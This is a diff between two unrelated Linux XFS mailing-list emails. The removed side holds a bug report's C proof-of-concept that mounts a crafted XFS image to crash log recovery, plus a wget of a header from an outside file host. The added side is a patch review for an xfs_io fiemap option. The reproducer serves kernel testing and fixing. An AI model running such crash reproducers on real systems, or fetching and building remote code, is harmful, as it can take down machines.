@@ -1,224 +1,145 @@
-Received: from mail-pj1-f42.google.com (mail-pj1-f42.google.com [209.85.216.42])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
+Received: from dggsgout11.his.huawei.com (dggsgout11.his.huawei.com [45.249.212.51])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D506425782D
-	for <linux-xfs@vger.kernel.org>; Wed, 15 Jul 2026 01:02:42 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.216.42
-ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1784077368; cv=pass; b=Y7R7PoUn9sxJY75ZjqefXCmgLmxeuMU1dvfjhEr7Mc5GGI4B62dpScZZbJ89pmSo9YtogwFp7u98vgcgNGSW1MFNANjOPKsEVGEAqldrSUq5S7y5tGUr6jm8Ji4MwRrwChV7ui1neYdV+PYWjpS8fSrlYzQD95br6e25pOZBjWw=
-ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1784077368; c=relaxed/simple;
-	bh=UY7ubxjdQH0v34juZ27hcyC/XR1h8srcV8LlOOPc9wo=;
-	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
-	 To:Cc:Content-Type; b=Roi0m88Qi8s1jLrOMhJcEGQuSlZrPkBAnckkAWXJA7vWowEnmLgqHqWuZ9WGy46tu7z+HCFWj2BrEmMqSIrCSjaZ0iLk1IaAomLKnSUEm42PASZLstNMnc1DBtHuB6VbRj35/W/VDE1WxYrgc2jUPjLS1juucB99nZ/sWw9yIDY=
-ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=msAA0lln; arc=pass smtp.client-ip=209.85.216.42
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
-Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="msAA0lln"
-Received: by mail-pj1-f42.google.com with SMTP id 98e67ed59e1d1-383b4a3755fso1473020a91.3
-        for <linux-xfs@vger.kernel.org>; Tue, 14 Jul 2026 18:02:42 -0700 (PDT)
-ARC-Seal: i=1; a=rsa-sha256; t=1784077362; cv=none;
-        d=google.com; s=arc-20260327;
-        b=GrKmCe/mfGkVelfR4zOk2H5AtJ1Gq1c67ULk/kZnN/ABnb5KFzrntphvDlHfYpqeuE
-         MGBltwE7qHWAgsC86kNy8kLzTTd/1Yn/8jlu/mzyyImv8C0Za2453lWf+hK2+6Guw3cR
-         Fr0BFLugzz6lO7qCbBPwwtzs3/R2as7CyK77EdjZ4SrB4310ohBMKIUOgahoSQyGeAnT
-         Buk1BnI8ULaySqPSpUUR5pu9NqsKc5Hc3ihFpcUYgBjsfiezTLvpmkpjl1VVaKsSjYrr
-         AV0tSBT/WANOXqprHaIHAVCzv2AI6TLc9XpDPedGvgL/srp9jx8wHMvB4XgghfRzZeUP
-         bgGw==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:dkim-signature;
-        bh=ny+Y8aJedlosdwWq4xMtvdxX6hbxb2mSbZ1S3HF7xwE=;
-        fh=YLKsVTe+jmYgZR3udSu1I+j1EMe+IQITeQfU0+6LnaU=;
-        b=ZQ0dMAaAc6C2bI4WGLwQc0kY4ckDUCdSArXiAw1BczUSBqWGpfoRmWAFkjpu2tZJS7
-         mOWM+xJXPv2APWgPXlXwQifsruDrC6BUjnhGUU6moD0BVdMLzfrNLPF1d8Z2/yD4anu0
-         r0mJhEiJuDPSxfONQJZ9NM/i75FLn1ghQWZ0AXyhme55BXVHlaMM6jNQpPhRGHpSlSqU
-         Wo9so3CX2HwS1PPeSUZCnR8XpPOa4NZfWsvfE1h8QsIPEZhwSjfC6vEVncuQ3LvnXDBI
-         t+oRIzmHKHBdlO6wvptyy1KyJUwDxCYqYEvfokBhCRtJZ+iXlXATziCyj/BSOIaWPKh8
-         ndNA==;
-        darn=vger.kernel.org
-ARC-Authentication-Results: i=1; mx.google.com; arc=none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=asu.edu; s=google; t=1784077362; x=1784682162; darn=vger.kernel.org;
-        h=content-transfer-encoding:content-type:cc:to:subject:message-id
-         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
-         :date:message-id:reply-to:content-type;
-        bh=ny+Y8aJedlosdwWq4xMtvdxX6hbxb2mSbZ1S3HF7xwE=;
-        b=msAA0llnBJQmoWQXUwE67iiHKy37Bh93Lxc7F7RXimpWt1w6wpwuItk4LTtKp7yvlZ
-         pE0wI7TzOQHBkpz8PSolHmlzNP66oVH8Ju8XE3+Cvk7he70sOwRknLKd0yB35eRgh1cy
-         EqNf1xNzYnddc+g5i6CZ1ebun8VvWUpWFGWhqKme4uYDhxOGyk3tte4Py3Vkqk5QHXEU
-         VDPXXyxMBcii+90iFm/jZ03mTG4F2JElCEric3VRDL1jkGqvDM0RT/IZfL81/Hb7Lza+
-         orkXt3RIlmVx2T+lVqKuEOmzhIfCZTpw2tuR7tMsDvr/y3xZbWtERzd+0+zAqfIFhfNR
-         nLig==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1784077362; x=1784682162;
-        h=content-transfer-encoding:content-type:cc:to:subject:message-id
-         :date:from:in-reply-to:references:mime-version:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=ny+Y8aJedlosdwWq4xMtvdxX6hbxb2mSbZ1S3HF7xwE=;
-        b=lZuRCUYg0bLwh6DaxrOc2ynVxytA6d8GNy88GA9gCiN/vBYJvfbd3+YaE/4iEx2rRL
-         GtKTWGvH6ppVMMKkiCHSmSFNGIslU+fOmeU4oK0CY8t6njLEX8QLi7VGS1NJvKDElHbq
-         EkOlbbe8ZBVaiZnEFtOm8OnGaxVBB1yQVp2SVc91e8BUDIDGiHQ/P4NFS5yxSIqdWb7j
-         m3EsftkTOPuJ3MQlikTCZoDtHq6fpdNIzKL5AnxMsvTgHOvzcS6YJlDRnXDmdj5YOeyS
-         o1CKFUNjDzy+XeYzlujkRI5R4okBqUTo+HYJBYo1PJ/jTlk2vIliVvJ8tHqX64RfBIxg
-         U05A==
-X-Forwarded-Encrypted: i=1; AHgh+RposrLDdJCDttHLIs6dhhIX8dPq3+TkjigutMqAuQ6Us4UwngxXb0JkRZFjlishehpD7lBr8uBy5+M=@vger.kernel.org
-X-Gm-Message-State: AOJu0YyTIYwY7oM2zywOVh0atNUvj2bFOSDka5Fz5R/8hp0P8VXe0rwy
-	QgCHv4uE+aPfTR6wfWE8kKbc67CJDdzX9UXb9UNEEGpN4n0XYL71YF/8kkIajgLA/e6dZWt6l0e
-	00jsIHCcEWMa5hNWItGkPPk15lefvUd+zl4Ll7JOtZ51kvi+g142OVByjno8=
-X-Gm-Gg: AfdE7cmdcjoSyQMzPVmPXN79N11dSyA/cClb7vIvOcpLjGGT8FfflAna9WAPeTwpiqy
-	SlRUtKWDRgdplZ8VAvkDcZXGKeYL33rQiY2NxIKrOzEzyBNBzcn2XXCb7x3ZiL/ykUbHxbT8L3N
-	R0mMKSLgBvBqq7LtMacOG+xPUBpfT7FcnXOFOR7x2WzZ27fmSZewZ+5F5ZxLBLsUqUUmeDOX55F
-	leBfktqtm8/myJuiOJ1mzZ7XbRTMRAD0CvLWfBDjXEStDPTFQbWRsyVL04PKC2VmLglUzVJKB3b
-	zNppdbcvAmOy1YjtUuR8knzFjWFw
-X-Received: by 2002:a17:90b:3b89:b0:387:e0db:3fad with SMTP id
- 98e67ed59e1d1-38dc7778aedmr13995855a91.38.1784077362264; Tue, 14 Jul 2026
- 18:02:42 -0700 (PDT)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 0DD3C317170
+	for <linux-xfs@vger.kernel.org>; Wed, 15 Jul 2026 01:13:02 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=45.249.212.51
+ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1784077986; cv=none; b=Ojlpzn7u/5ll52nQuPW9qB2Rmhq7td5ZI6O7IrU4x/qDZwtAc1xrvb2lqajA0ZxPewV2CtjYcWec1nfJaLpwRpDqI6DHG/35wLkdCaIRniMIPJ7SPa6puRZC3mHeVVDh1t8gUp9VuBNCR9SZ1GahMn4xCkHYxXlRzvwEhC4zWk8=
+ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1784077986; c=relaxed/simple;
+	bh=rGthIpKCASynYRL9qBQQEN06FmO92yBWKnlJXjcWvRs=;
+	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
+	 In-Reply-To:Content-Type; b=rDh8avLxiUa5Rv2c5o8+87NJTR+O5Q2blQDydqdSvAja0wmJy2Ht9Li2mh+0zlvsEBn4uwEuLFSTZMeZNteml4C7ss4TEpcVFKhv9ORW602cTF8srszKv5Dt2bt/M3WOAVIy5XlS+7RflLWCO0XDOhPA2P++5dvwtBYvOeYXgPw=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=huaweicloud.com; spf=none smtp.mailfrom=huaweicloud.com; arc=none smtp.client-ip=45.249.212.51
+Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=huaweicloud.com
+Authentication-Results: smtp.subspace.kernel.org; spf=none smtp.mailfrom=huaweicloud.com
+Received: from mail.maildlp.com (unknown [172.19.163.177])
+	by dggsgout11.his.huawei.com (SkyGuard) with ESMTPS id 4h0J7b2ttgzYQtmg
+	for <linux-xfs@vger.kernel.org>; Wed, 15 Jul 2026 09:12:43 +0800 (CST)
+Received: from mail02.huawei.com (unknown [10.116.40.112])
+	by mail.maildlp.com (Postfix) with ESMTP id 96A1B40590
+	for <linux-xfs@vger.kernel.org>; Wed, 15 Jul 2026 09:12:59 +0800 (CST)
+Received: from [10.174.178.253] (unknown [10.174.178.253])
+	by APP1 (Coremail) with UTF8SMTPSA id cCh0CgAHZHCZ3lZqed0PBQ--.29010S3;
+	Wed, 15 Jul 2026 09:12:59 +0800 (CST)
+Message-ID: <3300e6fc-6390-46b9-8ac4-d15bea64f35c@huaweicloud.com>
+Date: Wed, 15 Jul 2026 09:12:57 +0800
 Precedence: bulk
 X-Mailing-List: linux-xfs@vger.kernel.org
 List-Id: <linux-xfs.vger.kernel.org>
 List-Subscribe: <mailto:linux-xfs+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-xfs+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-References: <20260712220854.3131445-1-xmei5@asu.edu> <alSr3bJ8yow3ID9K@infradead.org>
-In-Reply-To: <alSr3bJ8yow3ID9K@infradead.org>
-From: Xiang Mei <xmei5@asu.edu>
-Date: Tue, 14 Jul 2026 18:02:31 -0700
-X-Gm-Features: AUfX_mztmdkU4Yga2wpYw1HphT4cAw6HQeuWY0T733tvnEnUi6z4LwZd8K2vjbU
-Message-ID: <CAPpSM+QN-6pgBYLfyYVmBr1b1gXsuOgTci-4V8qwd4wewzf4Mw@mail.gmail.com>
-Subject: Re: [PATCH] xfs: reject log continuation for a header-only item in recovery
-To: Christoph Hellwig <hch@infradead.org>
-Cc: Carlos Maiolino <cem@kernel.org>, linux-xfs@vger.kernel.org, linux-kernel@vger.kernel.org, 
-	bestswngs@gmail.com
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+User-Agent: Mozilla Thunderbird
+Subject: Re: [PATCH v3] fiemap: add a nosync option
+To: Pankaj Raghav <p.raghav@samsung.com>, aalbersh@kernel.org
+Cc: pankaj.raghav@linux.dev, hch@lst.de, gost.dev@samsung.com,
+ linux-xfs@vger.kernel.org, djwong@kernel.org
+References: <20260714203206.520348-1-p.raghav@samsung.com>
+Content-Language: en-US
+From: Zhang Yi <yi.zhang@huaweicloud.com>
+In-Reply-To: <20260714203206.520348-1-p.raghav@samsung.com>
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+X-CM-TRANSID:cCh0CgAHZHCZ3lZqed0PBQ--.29010S3
+X-Coremail-Antispam: 1UD129KBjvJXoWxXr1xtFyfAF4DAw4xKFy8Zrb_yoW5WF17pr
+	s8uw1Yka13tF4IgFs7J3yxK3WrKw1UKF40kr98Xw13ZF98tFn7GFnYk3W0qw17Wr93XFZ8
+	XrWYv3W3Ga1qyaDanT9S1TB71UUUUU7qnTZGkaVYY2UrUUUUjbIjqfuFe4nvWSU5nxnvy2
+	9KBjDU0xBIdaVrnRJUUUyKb4IE77IF4wAFF20E14v26r4j6ryUM7CY07I20VC2zVCF04k2
+	6cxKx2IYs7xG6rWj6s0DM7CIcVAFz4kK6r1j6r18M28lY4IEw2IIxxk0rwA2F7IY1VAKz4
+	vEj48ve4kI8wA2z4x0Y4vE2Ix0cI8IcVAFwI0_tr0E3s1l84ACjcxK6xIIjxv20xvEc7Cj
+	xVAFwI0_Gr1j6F4UJwA2z4x0Y4vEx4A2jsIE14v26r4UJVWxJr1l84ACjcxK6I8E87Iv6x
+	kF7I0E14v26F4UJVW0owAS0I0E0xvYzxvE52x082IY62kv0487Mc02F40EFcxC0VAKzVAq
+	x4xG6I80ewAv7VC0I7IYx2IY67AKxVWUJVWUGwAv7VC2z280aVAFwI0_Jr0_Gr1lOx8S6x
+	CaFVCjc4AY6r1j6r4UM4x0Y48IcVAKI48JMxkF7I0En4kS14v26r126r1DMxAIw28IcxkI
+	7VAKI48JMxC20s026xCaFVCjc4AY6r1j6r4UMI8I3I0E5I8CrVAFwI0_Jr0_Jr4lx2IqxV
+	Cjr7xvwVAFwI0_JrI_JrWlx4CE17CEb7AF67AKxVWUAVWUtwCIc40Y0x0EwIxGrwCI42IY
+	6xIIjxv20xvE14v26r1j6r1xMIIF0xvE2Ix0cI8IcVCY1x0267AKxVWUJVW8JwCI42IY6x
+	AIw20EY4v20xvaj40_Jr0_JF4lIxAIcVC2z280aVAFwI0_Jr0_Gr1lIxAIcVC2z280aVCY
+	1x0267AKxVWUJVW8JbIYCTnIWIevJa73UjIFyTuYvjxUwxhLUUUUU
+X-CM-SenderInfo: d1lo6xhdqjqx5xdzvxpfor3voofrz/
 
-On Mon, Jul 13, 2026 at 2:12=E2=80=AFAM Christoph Hellwig <hch@infradead.or=
-g> wrote:
->
-> On Sun, Jul 12, 2026 at 03:08:54PM -0700, Xiang Mei wrote:
-> > On an XLOG_WAS_CONT_TRANS op, xlog_recover_add_to_cont_trans() extends =
-the
-> > tail item's last region via item->ri_buf[item->ri_cnt-1] without checki=
-ng
-> > that the item has one. A header-only item, created by
-> > xlog_recover_add_to_trans() when a transaction's first op is a bare
-> > sizeof(struct xfs_trans_header) op carrying XFS_TRANS_HEADER_MAGIC, sit=
-s on
-> > r_itemq with ri_cnt =3D=3D 0 and ri_buf =3D=3D NULL. A crafted log whos=
-e ops are
-> > XLOG_START_TRANS, that header op, then XLOG_WAS_CONT_TRANS thus
-> > dereferences ((struct kvec *)NULL)[-1] and faults during mount(2) log
-> > recovery of an untrusted XFS image.
-> >
-> > A valid XLOG_WAS_CONT_TRANS only follows a region written with
-> > XLOG_CONTINUE_TRANS, so ri_cnt >=3D 1 always holds for a real log. Reje=
-ct the
-> > ri_cnt =3D=3D 0 case as corruption with -EFSCORRUPTED, which the caller=
- already
-> > propagates to abort recovery.
->
-> Looks good:
->
-> Reviewed-by: Christoph Hellwig <hch@lst.de>
->
-> Can you share your code to generate these malformed logs?  Because it
-> would be really useful  to test these conditions regularly in xfstests..
->
+On 7/15/2026 4:32 AM, Pankaj Raghav wrote:
+> io/fiemap adds FIEMAP_FLAG_SYNC by default. There are some test cases
+> where adding this flag might have an undesired side effect on the
+> results [1].
+> 
+> Add an option that does not pass FIEMAP_FLAG_SYNC flag.
+> 
+> [1] https://lore.kernel.org/linux-xfs/ca21b3c4-e1df-4ba7-8e9c-5d221337c86b@huaweicloud.com/
+> 
+> Signed-off-by: Pankaj Raghav <p.raghav@samsung.com>
 
-Of course. Here is some information to reproduce the bug:
+Thanks for the patch, this looks good to me!
 
-1. CONFIGS:
-```
-CONFIG_XFS_FS=3Dy
-CONFIG_BLK_DEV_LOOP=3Dy
-CONFIG_BLK_DEV_LOOP_MIN_COUNT=3D0
-CONFIG_TMPFS=3Dy
-CONFIG_KASAN=3Dy
-CONFIG_KASAN_INLINE=3Dy
-```
+Reviewed-by: Zhang Yi <yi.zhang@huawei.com>
 
-2. Reproducer (gcc ./exp.c -o ./exploit -lpthread -static -lz -w)
-```c
-#define _GNU_SOURCE
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <fcntl.h>
-#include <unistd.h>
-#include <errno.h>
-#include <sys/ioctl.h>
-#include <sys/mount.h>
-#include <sys/stat.h>
-#include <sys/types.h>
-#include <sys/sysmacros.h>
-#include <linux/loop.h>
-#include <zlib.h>
+> ---
+> Changes since v2:
+> - Add this option to the man page (Darrick)
+> - Add more information about this flag in the help.
+> Changes since v1:
+> - Change '-s' to '-e' to match xfs_bmap (Christoph).
+> 
+>  io/fiemap.c       | 9 +++++++--
+>  man/man8/xfs_io.8 | 2 +-
+>  2 files changed, 8 insertions(+), 3 deletions(-)
+> 
+> diff --git a/io/fiemap.c b/io/fiemap.c
+> index b41f71bf..cf3a1b3e 100644
+> --- a/io/fiemap.c
+> +++ b/io/fiemap.c
+> @@ -36,6 +36,7 @@ fiemap_help(void)
+>  " -a -- prints the attribute fork map instead of the data fork.\n"
+>  " -l -- also displays the length of each extent in 512-byte blocks.\n"
+>  " -n -- query n extents.\n"
+> +" -e -- obtains also delayed allocation extents by not using FIEMAP_FLAG_SYNC.\n"
+>  " -v -- Verbose information\n"
+>  " offset is the starting offset to map, and is optional.  If offset is\n"
+>  " specified, mapping length may (optionally) be specified as well."
+> @@ -242,7 +243,7 @@ fiemap_f(
+>  
+>  	init_cvtnum(&fsblocksize, &fssectsize);
+>  
+> -	while ((c = getopt(argc, argv, "aln:v")) != EOF) {
+> +	while ((c = getopt(argc, argv, "aln:ev")) != EOF) {
+>  		switch (c) {
+>  		case 'a':
+>  			fiemap_flags |= FIEMAP_FLAG_XATTR;
+> @@ -253,6 +254,10 @@ fiemap_f(
+>  		case 'n':
+>  			max_extents = atoi(optarg);
+>  			break;
+> +		case 'e':
+> +			/* nosync */
+> +			fiemap_flags &= ~(FIEMAP_FLAG_SYNC);
+> +			break;
+>  		case 'v':
+>  			vflag++;
+>  			break;
+> @@ -393,7 +398,7 @@ fiemap_init(void)
+>  	fiemap_cmd.argmin = 0;
+>  	fiemap_cmd.argmax = -1;
+>  	fiemap_cmd.flags = CMD_NOMAP_OK | CMD_FOREIGN_OK;
+> -	fiemap_cmd.args = _("[-alv] [-n nx] [offset [len]]");
+> +	fiemap_cmd.args = _("[-alev] [-n nx] [offset [len]]");
+>  	fiemap_cmd.oneline = _("print block mapping for a file");
+>  	fiemap_cmd.help = fiemap_help;
+>  
+> diff --git a/man/man8/xfs_io.8 b/man/man8/xfs_io.8
+> index 61defcc3..a3ddab02 100644
+> --- a/man/man8/xfs_io.8
+> +++ b/man/man8/xfs_io.8
+> @@ -353,7 +353,7 @@ Prints the block mapping for the current open file. Refer to the
+>  .BR xfs_bmap (8)
+>  manual page for complete documentation.
+>  .TP
+> -.BI "fiemap [ \-alv ] [ \-n " nx " ] [ " offset " [ " len " ]]"
+> +.BI "fiemap [ \-alev ] [ \-n " nx " ] [ " offset " [ " len " ]]"
+>  Prints the block mapping for the current open file using the fiemap
+>  ioctl.  Options behave as described in the
+>  .BR xfs_bmap (8)
+> 
+> base-commit: e80b048d87fdc5735e0d03ae29b497b402ea8bbe
 
-#include "img_blob.h"
-
-#define IMG_PATH  "/tmp/poc.img"
-#define MNT_PATH  "/tmp/mnt"
-
-static void die(const char *m) { perror(m); exit(1); }
-
-static void inflate_image(void)
-{
-    unsigned char *out =3D malloc(IMG_ORIG_SIZE);
-    if (!out) die("malloc");
-
-    z_stream zs;
-    memset(&zs, 0, sizeof(zs));
-    zs.next_in =3D (unsigned char *)img_gz;
-    zs.avail_in =3D img_gz_len;
-    zs.next_out =3D out;
-    zs.avail_out =3D IMG_ORIG_SIZE;
-
-    if (inflateInit2(&zs, 15 + 16) !=3D Z_OK) die("inflateInit2");
-    if (inflate(&zs, Z_FINISH) !=3D Z_STREAM_END) die("inflate");
-    inflateEnd(&zs);
-
-    int fd =3D open(IMG_PATH, O_RDWR | O_CREAT | O_TRUNC, 0644);
-    if (fd < 0) die("open img");
-    if (write(fd, out, zs.total_out) !=3D (ssize_t)zs.total_out) die("write=
- img");
-    close(fd);
-    free(out);
-}
-
-int main(void)
-{
-    char loopdev[64];
-
-    inflate_image();
-    mkdir(MNT_PATH, 0755);
-
-    int ctl =3D open("/dev/loop-control", O_RDWR);
-    int devnr =3D ioctl(ctl, LOOP_CTL_GET_FREE);
-    close(ctl);
-    snprintf(loopdev, sizeof(loopdev), "/dev/loop%d", devnr);
-
-    int filefd =3D open(IMG_PATH, O_RDWR);
-    if (filefd < 0) die("open img for loop");
-
-    int loopfd =3D open(loopdev, O_RDWR);
-    if (loopfd < 0) die("open loopdev");
-    if (ioctl(loopfd, LOOP_SET_FD, filefd) < 0) die("LOOP_SET_FD");
-    close(filefd);
-
-    mount(loopdev, MNT_PATH, "xfs", 0, "");
-
-    umount(MNT_PATH);
-    ioctl(loopfd, LOOP_CLR_FD, 0);
-    close(loopfd);
-    return 0;
-}
-
-```
-
-Please compile after `wget https://filebin.net/68g43o706i6a5qw5/img_blob.h`
-Please tell me if you need more information to reproduce the bug.
-
-Xiang
